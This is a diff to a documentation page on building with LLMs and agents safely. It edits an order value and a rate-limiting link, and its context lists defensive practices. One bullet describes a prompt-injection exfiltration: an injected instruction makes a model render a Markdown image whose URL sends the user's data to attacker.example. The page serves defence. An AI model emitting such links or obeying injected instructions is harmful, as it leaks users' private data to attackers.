@@ -2,7 +2,7 @@
 title = "AI & LLM Security"
 description = "Building with LLMs and agents safely: the OWASP Top 10 for LLM Applications, why prompt injection is unsolved, and designing so it can't do damage."
 category = "Security"
-order = 9.4
+order = 706
 tags = ["security", "ai", "llm", "agents"]
 +++
 
@@ -35,7 +35,7 @@ With all three, the attack writes itself: a web page or email the agent reads sa
 - **No secrets in prompts.** Assume the system prompt and context will leak. Credentials live in the tool layer, never in text the model sees.
 - **Block exfiltration channels.** A model that can render Markdown can leak data without any tool at all: an injected instruction makes it output `![](https://attacker.example/?q=<the user's data>)`, and the user's browser sends the data the moment the image loads. Restrict which domains rendered links and images may load from (CSP helps, see [Security Headers & CSP](/docs/security/security-headers)).
 - **Sandbox execution.** Code an agent writes runs in an isolated container with no credentials and restricted network egress.
-- **Limit consumption.** Rate limits, token budgets and spend caps per user, so abuse costs you a bounded amount. See [Rate Limiting](/docs/operations/rate-limiting).
+- **Limit consumption.** Rate limits, token budgets and spend caps per user, so abuse costs you a bounded amount. See [Rate Limiting](/docs/requests/rate-limiting).
 - **Log and evaluate.** Keep prompts, tool calls and outputs (redacted) with [request IDs](/docs/operations/observability), and run regression evals that include known injection attempts.
 
 ## The OWASP Top 10 for LLM Applications (2025)
